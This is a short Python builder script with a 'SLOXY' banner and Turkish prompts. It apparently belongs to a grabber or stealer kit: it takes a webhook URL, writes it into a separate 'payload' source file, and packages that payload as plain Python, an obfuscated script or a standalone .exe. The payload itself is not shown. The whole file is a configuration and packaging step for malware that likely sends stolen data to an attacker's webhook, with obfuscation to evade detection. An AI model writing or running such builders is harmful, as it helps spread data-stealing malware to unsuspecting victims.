from colorama import init,Fore
from time import sleep
import os
import requests
import sys

init()
print(Fore.RED)
print("""
 $$$$$$\  $$\       $$$$$$\  $$\   $$\ $$\     $$\ 
$$  __$$\ $$ |     $$  __$$\ $$ |  $$ |\$$\   $$  |
$$ /  \__|$$ |     $$ /  $$ |\$$\ $$  | \$$\ $$  / 
\$$$$$$\  $$ |     $$ |  $$ | \$$$$  /   \$$$$  /  
 \____$$\ $$ |     $$ |  $$ | $$  $$<     \$$  /   
$$\   $$ |$$ |     $$ |  $$ |$$  /\$$\     $$ |    
\$$$$$$  |$$$$$$$$\ $$$$$$  |$$ /  $$ |    $$ |    
 \______/ \________|\______/ \__|  \__|    \__|                                                                                                                     
""")
print("------------------------------------------------")
print(Fore.BLUE)
wh = input("Webhook URL >> ")
response = requests.get(wh)
if response.status_code == 200:
    with open("source/main.py", "r+") as gg:
      text = gg.read()
      text = text.replace("WEBHOOKHERE", wh)
      gg.seek(0)
      gg.write(text)
      gg.truncate()
else:
    print("Fore.RED")
    print("Geçersiz webhook.")
    sleep(3)
    sys.exit()

exe = int(input("Çıktı türünü seçin\n1- .py\n2- Obfuscated .py\n3- .exe\n >> "))
if exe == 3:
      g = open("build.py","w")
      gg = open("source/main.py","r")
      payload = gg.read()
      g.write(payload)
      g.close()
      gg.close()
      os.system("pyinstaller --onefile build.py")
elif exe == 2:
    g = open("build.py", "w")
    gg = open("source/main.py", "r")
    payload = gg.read()
    g.write(payload)
    g.close()
    gg.close()
    os.system("python source/obfuscator.py build.py")
    os.remove("build.py")
    os.rename("Obfuscated_build.py","build.py")
elif exe == 1:
    g = open("build.py", "w")
    gg = open("source/main.py", "r")
    payload = gg.read()
    g.write(payload)
    g.close()
    gg.close()
else:
    print(Fore.RED)
    print("Hatalı seçim.")
    sleep(3)
    sys.exit()

print(Fore.RED)
print("\nBuildiniz oluşturulmuştur.")
sleep(5)
